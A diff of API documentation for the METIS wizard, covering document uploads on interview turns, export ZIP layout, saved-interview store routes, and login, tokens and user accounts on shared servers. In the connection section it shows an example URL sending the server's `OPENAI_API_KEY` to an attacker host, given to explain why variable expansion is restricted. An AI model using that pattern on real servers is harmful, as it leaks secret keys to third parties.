@@ -24,7 +24,8 @@ status of each role, never a key or a URL. Until the interview role is configure
 503 `model_unavailable`. The interview role also matches each Criterion to a library grader. The examples use `http://localhost:8001` and require `curl`
 and `jq`.
 
-The API is stateless. Your client owns the Interview state.
+The Interview routes are stateless. Your client owns the Interview state. The API also has
+store routes that can save it for you. See [Save Interviews in the store](#save-interviews-in-the-store).
 
 | Client rule | Required action |
 |---|---|
@@ -63,7 +64,8 @@ Use the returned IDs in the start request. An empty capability selection is vali
 
 ### Extract document text
 
-`POST /documents/extract` is optional. Call it before `/interview/start`.
+`POST /documents/extract` is optional. Call it before `/interview/start`, or before a turn that
+adds documents.
 
 ```bash
 curl --fail-with-body http://localhost:8001/api/v1/wizard/documents/extract \
@@ -72,7 +74,7 @@ curl --fail-with-body http://localhost:8001/api/v1/wizard/documents/extract \
 
 The response contains a `documents` list with canonical file names and extracted text. The route
 supports UTF-8 TXT, Markdown, YAML, JSON, CSV, PDF text layers, and DOCX files. It does not run OCR. Add the returned
-list to the start request. The opening document list cannot change after start.
+list to the start request, or to the `documents` field of a turn.
 
 Keep each original file. If a Scenario uses it, send the original bytes to `/package`.
 
@@ -209,6 +211,27 @@ Do not rebuild state from the visible Specification or from an abbreviated respo
 | `state` | Complete `state` from `interview.json`. |
 | `request_id` | Exact ID from `state.pending.request_id`. |
 | `response` | Typed answer that matches `state.pending.type`. |
+| `documents` | Optional. New documents to add with this answer, in the format of the start request. |
+
+### Add documents on a turn
+
+A turn can add documents at any stage. The API appends them to `state.context.documents` in the
+returned state, and each later model call can read them. The full list has the limits of the
+start request: the document count, the text size, and one name for each document. A turn that
+breaks a limit gets 422 and changes nothing.
+
+```json
+{
+  "state": {"...": "the complete state from interview.json"},
+  "request_id": "req-...",
+  "response": {"type": "chat", "text": "Use the escalation policy for the Criteria."},
+  "documents": [{"name": "escalation.md", "text": "Escalate a complaint within one day."}]
+}
+```
+
+The wizard tells the model which documents are new on that turn. A new document alone changes
+no Specification content. To use it, say so in the text of a `chat` response or in the
+`feedback` of a `choice` response. The new names are also available as Test Case files.
 
 Read the next screen with:
 
@@ -338,7 +361,7 @@ Use either endpoint after `/turn` or `/end` returns `done`.
 | Endpoint | Input | Output | Use |
 |---|---|---|---|
 | `POST /compile` | `state.specification` as JSON | `specification.yaml` as a string and `specification` with assigned Task IDs | Store or display YAML yourself. |
-| `POST /package` | One JSON form field: `state` for Interviews or `specification` for manual exports; an optional `connection` with `specification`; fixture file parts | `YYYYMMDD-HHMMSS-interview.zip` | Download a portable specification. |
+| `POST /package` | One JSON form field: `state` for Interviews or `specification` for manual exports; an optional `connection` with `specification`; fixture file parts | `YYYYMMDD-HHMMSS-interview-<random>.zip` | Download a portable specification. |
 
 Compile directly from `interview.json`:
 
@@ -359,20 +382,22 @@ jq -c '.state' interview.json | \
 ```
 
 Add one `-F 'files=@<path>'` part for each original fixture referenced by the completed Specification.
-The response `Content-Disposition` header supplies the ZIP filename. The ZIP contains a
-`YYYYMMDD-HHMMSS-interview/` root folder with `inputs/interview_state.json`, `outputs/specification.yaml`, and
-`outputs/fixtures/`. In run mode, it also contains `outputs/target-binding.yaml`. The API compiles the Specification directly from the supplied state and
+The response `Content-Disposition` header supplies the ZIP filename, `<id>.zip`, where `<id>` is
+`YYYYMMDD-HHMMSS-interview-<random>` at the time of the request. The ZIP contains
+`interviews/<id>/interview_state.json`, `specifications/<id>/specification.yaml`, and
+`specifications/<id>/fixtures/`. In run mode, it also contains
+`specifications/<id>/target-binding.yaml`. The API compiles the Specification directly from the supplied state and
 saves that same state with its current JSON format. Send exactly one source field; requests
 with both `state` and `specification` are rejected.
 
 For a manual export, send the user-authored Specification in the `specification` form field.
-The manual ZIP uses `YYYYMMDD-HHMMSS-manual.zip` and a matching root folder. It contains an
-empty `inputs/` folder and the same `outputs/` layout.
+The manual ZIP uses the `<id>` `YYYYMMDD-HHMMSS-manual-<random>`. It contains the same
+`specifications/<id>/` folder and no `interviews/` folder.
 
 To run a manual export, also send a `connection` form field. Its value is a connection as JSON,
 in the same shape as `state.context.connection`. The ZIP then contains
-`outputs/target-binding.yaml`, and `outputs/specification.yaml` names the generic runner and the
-binding file. This is the same export as an Interview with that connection. The API applies the
+`specifications/<id>/target-binding.yaml`, and `specification.yaml` names the generic runner and
+the binding file. This is the same export as an Interview with that connection. The API applies the
 same validation as `POST /connection/check`. A binding that is not valid gives a 400
 `validation_error`. Its message names each field and its reason, and never the value. Send
 `connection` only with `specification`. An Interview keeps its connection in its state, so a
@@ -387,10 +412,10 @@ curl --fail-with-body http://localhost:8001/api/v1/wizard/package \
 ```
 
 The API retains no uploaded bytes or experiment files. A successful package response contains
-a generated Specification and marks a completed export. Extract the archive into `experiments/design/`
-and use its dated folder as the Engine input. For example, run
-`metis engine run --input-dir experiments/design/20261016-223045-interview/outputs/`. Task fixture references stay relative
-to `outputs/fixtures/`. Wizard exports contain no Testbed caches or score files.
+a generated Specification and marks a completed export. Extract the archive into `evaluations/`
+and use its Specification folder as the Engine input. For example, run
+`metis engine run --input-dir evaluations/specifications/20261117-160005-interview-x9abc`. Task
+fixture references stay relative to `fixtures/` in that folder. Wizard exports contain no Testbed caches or score files.
 
 ## Connect the target
 
@@ -413,9 +438,16 @@ loads the start page, and checks that the API server answers. Any other API only
 binding: `live` is `false` and `status` is `unchecked`, because a server that fetches any URL that
 a client sends is a risk. `METIS_API_CONNECTION_CHECK=1` or `0` overrides this.
 
-The API never puts a value from its own environment into a URL that it requests. Otherwise a
-client could send `https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A
-`spec_url` or `start_url` that names a `${NAME}` variable is not requested: its probe says so, and
+The API reads the `HOST` variable to know its address. Start the API with `metis-api`, which
+listens on that same address. If you start Uvicorn directly with a `--host` option, also set
+`HOST` to that address, or the live check can be on for a server that other computers can reach.
+
+The API puts a value from its own environment into a URL that it requests only for a variable
+that `METIS_WORKSHOP_ENV` names. Each user account can already read those values. See
+[Turn on login for a shared server](#turn-on-login-for-a-shared-server). The API expands no
+other variable. Otherwise a client could send
+`https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A `spec_url` or
+`start_url` that names any other `${NAME}` variable is not requested: its probe says so, and
 `status` is `unchecked`. To check that URL, run `metis wizard connect` on the computer that has
 the variables.
 
@@ -452,8 +484,8 @@ To start in run mode, put a connection in the start request:
 The connection travels in `state.context.connection`. Prompts and the model never read it. A
 spec-only state has no `connection` key. To add or replace the connection later, send the state
 to `POST /connection` and save the returned state. `POST /package` then adds
-`outputs/target-binding.yaml`, and `outputs/specification.yaml` names the generic runner and the
-binding file.
+`specifications/<id>/target-binding.yaml`, and `specification.yaml` names the generic runner and
+the binding file.
 
 ## Handle errors and resume
 
@@ -483,3 +515,243 @@ Keep the `specification` returned by `/compile` when the request contains new Ta
 with blank IDs. Submit that Specification on later edits and to `/package`. Task IDs
 are assigned by the backend. Keep them when editing a Task. A Task is unique by its Persona and
 Scenario pair. `specification.yaml` is the only YAML file in the archive.
+
+## Save Interviews in the store
+
+The store routes save an Interview record for your client. The Interview routes do not use them.
+The web client uses them to keep its Interviews. A record is the JSON that the web client keeps:
+its id, title, stage, times, `state`, display `transcript`, and `fixtures` file list.
+
+| Route | Purpose |
+|---|---|
+| `GET /api/v1/targets` | List the saved Targets, newest first, and the rows that cannot be read. |
+| `PUT /api/v1/targets/{target_id}/interview` | Save the record and its new files. |
+| `GET /api/v1/targets/{target_id}/interview` | Read the record. |
+| `GET /api/v1/targets/{target_id}/interview/files/{name}` | Read one saved file. |
+| `GET /api/v1/targets/{target_id}/specification` | Read the last Specification and its input folder. |
+| `DELETE /api/v1/targets/{target_id}` | Delete the Target, its record, and its files. |
+
+The save is a multipart form. The `record` part is a file that contains the record JSON. Send each new file as a part
+named `files`, with the file name from the record. A file that the store already
+has needs no part. The store keeps only the files that the record refers to.
+
+Each file of the record has its own name. This includes the `fixtures` and the files of each
+transcript `outbound`. Two names that differ only by case are the same name. A record with two
+files of the same name gets 400 `validation_error`, and the store does not change. To add a file
+whose name is taken, give it a new name first. The web client adds ` (2)`, ` (3)`, and so on
+before the extension. A save that fails does not change the stored files.
+
+A file name is one portable name without a path. It has no control character and none of the
+characters `< > : " | ? *`, and it does not end with a dot or a space. It is not a Windows device
+name such as `CON` or `COM1`, with or without an extension. A name that breaks this rule gets 400
+`validation_error`. The web client applies the same rule when a user adds a file.
+
+```bash
+curl --fail-with-body -X PUT \
+  -F record=@record.json \
+  -F files=@policy.pdf \
+  http://localhost:8001/api/v1/targets/20261112-101500-interview/interview
+```
+
+The Target id is also the name of its folder. It has 1 to 64 letters, digits, `-` or `_`. The
+web client uses `YYYYMMDD-HHMMSS-interview-<random>`, in the local time of the first message,
+for example `20261112-101500-interview-k7mwp`. A `metis wizard init` folder has a name of the
+same form. The `created_at` of the record tells one Interview
+from another. A save with the id of another Interview gets 409 `target_exists` and the store does
+not change. The web client then saves again with `-2`, `-3`, and so on at the end of the id.
+
+For an existing saved Interview, the store keeps the record and its files. It prepares a missing
+completed Specification when you first read its Specification route. A compilation error affects
+that request; you can still read and edit the Interview.
+
+When the saved state is done, the API compiles the Specification. It writes the Specification
+and an input folder for `metis engine simulate --input-dir`. If the Specification does not
+compile, the save gets 400 `compilation_failed` and the store does not change. A missing Target
+or file gets 404 `not_found`.
+
+The API keeps its store in the project folder. Start the API with
+`metis-api --project-dir PATH` to choose that folder. Without the option, the project folder is
+the nearest folder at or above the working directory that has a `pyproject.toml`. When no such
+folder is found, it is the working directory. `metis engine simulate` uses the same rule.
+
+- Everything is in the `evaluations/` folder of the project folder. The database is
+  `evaluations/metis.db`. Set `METIS_DATABASE_URL` to use another database.
+- The Interview of each Target is in `evaluations/interviews/<target_id>/`, the same layout as
+  the CLI wizard. `interview_state.json` holds the state of the Interview, and `documents/` holds
+  the files that you upload.
+- `evaluations/specifications/<target_id>/` holds the Specification. Give this folder to
+  `metis engine simulate --input-dir`. The `input_dir` field of the Specification response is its
+  path, for example `evaluations/specifications/20261117-143000-interview-k7mwp`.
+- The engine writes each Experiment to `evaluations/experiments/<specification-id>-YYYYMMDD-HHMMSS/`.
+  A delete of the Target removes its Interview folder and its Specification folder, and keeps its
+  Experiment folders.
+
+## Turn on login for a shared server
+
+Login is off by default. Then each route is open, which is correct for an API on your own
+computer. Turn login on when many people use one METIS server, for example in a workshop.
+
+Set these variables in the environment of the API, then start it:
+
+```bash
+METIS_LOGIN=1
+METIS_JOIN_TOKEN=<a long random value>
+METIS_ADMIN_TOKEN=<a different long random value>
+METIS_ADMIN_USERNAME=<your username>
+METIS_ADMIN_PASSWORD=<a long random password>
+```
+
+`METIS_JOIN_TOKEN` is the join token, which participants type on the login page.
+`METIS_ADMIN_TOKEN` is the admin token, for your own scripts. Do not give it to participants.
+Both are optional. Make each with a tool such as `openssl rand -hex 32`.
+`METIS_ADMIN_USERNAME` and `METIS_ADMIN_PASSWORD` name the admin of the server. Set both or
+neither. At each start, the API makes this user account or sets its password. Login has no limit
+on the number of tries, so use a long random password.
+
+Participants can also use the METIS CLI on their own computers. For this, they need some
+values of the server, such as the Langfuse keys of the target. Name these variables in
+`METIS_WORKSHOP_ENV`, separated by commas:
+
+```bash
+METIS_WORKSHOP_ENV=LANGFUSE_PUBLIC_KEY,LANGFUSE_SECRET_KEY,LANGFUSE_BASE_URL
+```
+
+The API reads their values at startup, also from `.env`. `GET /api/v1/workshop/env` returns each
+variable that has a value, in the same order, and the web app shows them as `.env` lines under
+**CLI settings** in the account menu. Without `METIS_WORKSHOP_ENV`, the route returns 404
+`not_found`. The live connection check also puts these values into a `spec_url` or `start_url`
+that names them, such as `${TOYAPP_API_URL}/openapi.json` for the demo Target. Each user account
+with a login session can read these values. List only values for participants. Never list a model provider key or a `METIS_` variable.
+
+The API does not start when one of these variables is set and `METIS_LOGIN` is not `1`, when the
+two tokens are the same, when only one of the two admin variables is set, or when
+`METIS_WORKSHOP_ENV` has a name that is not a variable name, a name that starts with `METIS_`,
+or a name more than one time.
+
+When login is on, each route under `/api` needs a login session. A request without one gets 401
+`login_required`. The exceptions are `POST /api/v1/auth/login`, `POST /api/v1/auth/logout`,
+and the user routes, which check their own credentials. `/health` is always open.
+
+### Make a user account
+
+An admin is a user account that can manage the other user accounts. The admin token has the
+same power, with no login session. The join token can only make user accounts that are not
+admins.
+
+| Route | Purpose | Who can use it |
+|---|---|---|
+| `POST /api/v1/users` | Make a user account and return its credentials. | The join token, an admin, or the admin token |
+| `GET /api/v1/users` | List the user accounts with their id, username, creation time, and admin flag. | An admin, or the admin token |
+| `POST /api/v1/users/{username}/password` | Give a user account a new password and return it. | An admin, or the admin token |
+| `DELETE /api/v1/users/{username}` | Delete a user account with its records and its folder. | An admin, or the admin token |
+
+Send a token in an `Authorization: Bearer` header, over HTTPS. Do not put it in a URL. A request
+with that header does not use its login cookie. An unknown token gets 401 `invalid_token`. A
+caller that is not allowed gets 403 `admin_required`. With login off, each user route returns 404
+`not_found`.
+
+`POST /api/v1/users` takes an optional body `{"admin": true}` to make an admin. The join token
+cannot send it.
+
+A participant makes a user account with the join token:
+
+```bash
+curl -X POST https://metis.example/api/v1/users \
+  -H "Authorization: Bearer $METIS_JOIN_TOKEN"
+```
+
+```json
+{
+  "id": "3f6c2a9d5b7e4c1e8a0f2d4b6c8e0a1c",
+  "username": "curious-otter",
+  "password": "k7mwp-3xr9t",
+  "created_at": "2026-11-14T08:30:00Z",
+  "admin": false
+}
+```
+
+METIS makes the username and the password. This response is the only one of the API that has
+the password, and the database keeps only a hash of it. Keep the password when you get it: no
+route and no file gives it again. For debugging, the server writes `users/<user id>/user.json`
+with the id, the username, and the times of creation, last login, and last write, so you can
+tell which user account a folder belongs to. Each request makes one more user account. A user account
+has no end date, and a person cannot change its credentials.
+
+`POST /api/v1/users/{username}/password` gives a user account a new password and ends its login
+sessions. The response has the shape above, and it is the only one that has the new password.
+
+`DELETE /api/v1/users/{username}` deletes a user account with its Targets, their records, and the
+folder `users/<user id>/`. You cannot undo it. It returns 204. An unknown username gets 404
+`not_found`. The API refuses these deletes with 409:
+
+- `cannot_delete_self`: the user account of your login session.
+- `environment_admin`: the admin of `METIS_ADMIN_USERNAME`, which the server makes again at each
+  start.
+- `local_account`: the user account that holds the records of the server with login off.
+- `run_in_progress`: a user account with an experiment that runs or waits in the queue. Stop it,
+  then try again.
+
+The join token cannot list, reset, or delete user accounts, and it cannot read records. You can
+thus give it to each participant, and a website that gives credentials to its visitors can hold
+it on its server. That website must decide who gets a user account, and how many. The admin token
+opens only the user routes. Keep it for your own scripts.
+
+Each new user account gets its own demo Target, the Northstar Policy & Report Assistant, with
+a done Interview and one finished Experiment. See
+[The demo Target](web.md#the-demo-target). A user account that exists before the server has
+this feature does not get one. For a workshop, set up the server before you make the user
+accounts:
+
+- Run the [agentic-eval toy app](https://github.com/govtech-responsibleai/agentic-eval-toyapp)
+  where the server can reach it, and set `TOYAPP_API_URL` to its address, for example
+  `http://127.0.0.1:8000`. The Target binding of the demo reads this variable. The checks of
+  `metis doctor` do not read it, so a server without it shows **Server ready** and the
+  experiment fails when it starts.
+- Set the model keys and the Langfuse keys that an experiment needs. See the
+  [Engine guide](../engine.md).
+
+A person can read the finished Experiment of the demo without these settings. Only a new
+experiment needs them.
+
+### Records of each user account
+
+When login is on, each person sees only the records of their own user account: the Targets,
+with their Interviews, files, Specifications, and Experiments. A record of another user account
+gets 404 `not_found`, as a record that does not exist. A save with the Target id of another
+user account gets 409 `target_exists`. Two user accounts can use the same Experiment folder name.
+
+Each user account has its own project folder at `users/<user id>/` in the project folder of
+the server. The layout inside it is the same as on your own computer, for example
+`users/<user id>/evaluations/interviews/<target_id>/`. Every path in a request or a response is
+relative to that folder. The database stays at `evaluations/metis.db` in the project folder of
+the server, and that `evaluations/` folder holds no other files.
+
+Records that a server saved with login off belong to the local user account. A user account of
+a login does not see them.
+
+### Log in and log out
+
+| Route | Purpose |
+|---|---|
+| `POST /api/v1/auth/login` | Check a username and a password, and start a login session. |
+| `POST /api/v1/auth/logout` | End the login session. |
+| `GET /api/v1/auth/me` | Tell if login is on, and name the current user account and if it is an admin. |
+
+`POST /api/v1/auth/login` takes `{"username": "...", "password": "..."}`. Correct credentials
+return the user account and set the `metis_login` cookie. The cookie is HTTP-only and
+`SameSite=Lax`. It is also `Secure` when `HOST` is not an address of the same computer, so serve
+a shared server over HTTPS. Wrong credentials get 401 `invalid_credentials`. The check ignores
+space around each value and the case of the username. The case of a password that METIS made
+does not matter.
+
+A login session ends at logout, or 30 days after the login. Then the person logs in again with
+the same credentials.
+
+`GET /api/v1/auth/me` returns `{"login": true, "user": {...}}` in a login session. With login
+off it returns `{"login": false, "user": null}`. A browser client calls it first. A 401
+`login_required` from this route, or from another route, means "show the login page".
+
+When login is on, a request that changes data must come from a page of the METIS server. A
+browser request from a page of another website gets 403 `cross_site_request`. The API reads
+the `Sec-Fetch-Site` header that the browser sets, and the `Origin` header for a browser that
+does not set it. A request from a program has neither header and is not affected.
